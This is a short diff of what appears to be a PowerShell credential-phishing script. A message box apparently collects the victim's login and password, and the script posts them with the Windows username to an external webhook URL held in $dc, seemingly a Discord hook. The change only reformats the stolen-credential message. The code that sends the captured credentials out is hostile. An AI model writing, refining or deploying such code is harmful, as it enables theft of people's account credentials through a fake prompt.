@@ -69,7 +69,7 @@ $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgIm
 $hookurl = "$dc"
 $Body = @{
   'username' = $env:username 
-  'content' = "user: $userlogin - pass: $passlogin"
+  'content' = "user: $userlogin <br> pass: $passlogin"
 }
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
 
